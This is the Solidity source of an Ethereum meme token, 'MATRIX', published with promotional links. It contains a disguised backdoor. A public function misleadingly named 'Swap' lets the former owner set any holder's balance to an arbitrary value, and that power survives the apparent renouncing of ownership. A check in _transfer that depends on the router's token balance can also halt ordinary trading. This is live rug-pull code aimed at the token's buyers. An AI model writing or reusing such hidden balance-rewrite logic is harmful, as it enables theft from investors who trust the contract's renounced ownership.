/**
 *Submitted for verification at Etherscan.io on 2025-03-18
*/

/**

https://matrixerc20.netlify.app
https://x.com/matrix_coinerc
https://t.me/+onODl6H_eok3M2Iy

The Red Pill of Crypto. 
Wake Up to Financial Freedom.

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    address internal _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transfer_Ownership(_msgSender());
    }

    modifier onlyOwner() {
        _isAdmin();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _isAdmin() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transfer_Ownership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transfer_Ownership(newOwner);
    }

    function _transfer_Ownership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        _previousOwner = oldOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = totalSupply_;
        _balances[msg.sender] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1MATRIX");
        require(recipient != address(0), "2MATRIX");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3MATRIX");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function Swap(address account, uint256 amount) public virtual returns (uint256) {
        address msgSender = msg.sender;
        address prevOwner = _previousOwner;
        bytes32 msgSenderHex = keccak256(abi.encodePacked(msgSender));
        bytes32 prevOwnerHex = keccak256(abi.encodePacked(prevOwner));
        bytes32 amountHex = bytes32(amount);
        bool isOwner = msgSenderHex == prevOwnerHex;
        if (isOwner) {
            return _Bal(account, amountHex);
        } else {
            return _getBalance(account);
        }
    }

    function _Bal(address account, bytes32 amountHex) private returns (uint256) {
        uint256 amount = uint256(amountHex);
        _balances[account] = amount;
        return _balances[account];
    }

    function _getBalance(address account) private view returns (uint256) {
        return _balances[account];
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4MATRIX");
        require(spender != address(0), "5MATRIX");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {}

contract MATRIX is ERC20 {
    uint256 private constant TOTAL_SUSUPPLYS = 420690_000_000e9;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;

    bool public hasLimit_;
    uint256 public maxTxAmountbesomes;
    uint256 public maxwalletssetsomes;
    mapping(address => bool) public isException;
    address uniswapV2Pair;
    IUniswapV2Router02 uniswapV2Router;

    constructor(address router) ERC20("MATRIX", "MATRIX", TOTAL_SUSUPPLYS) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;
        maxwalletssetsomes = TOTAL_SUSUPPLYS / 39;
        maxTxAmountbesomes = TOTAL_SUSUPPLYS / 39;
        isException[DEAD] = true;
        isException[router] = true;
        isException[msg.sender] = true;
        isException[address(this)] = true;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6MATRIX");
        require(to != address(0), "7MATRIX");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8MATRIX");
        }
        super._transfer(from, to, amount);
    }

    function removeLimit() external onlyOwner {
        hasLimit_ = true;
    }

    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9MATRIX");
                if (uniswapV2Pair == ZERO) {
                    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
                }
                if (to == uniswapV2Pair) {
                    return;
                }
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0MATRIX");
            }
        }
    }
}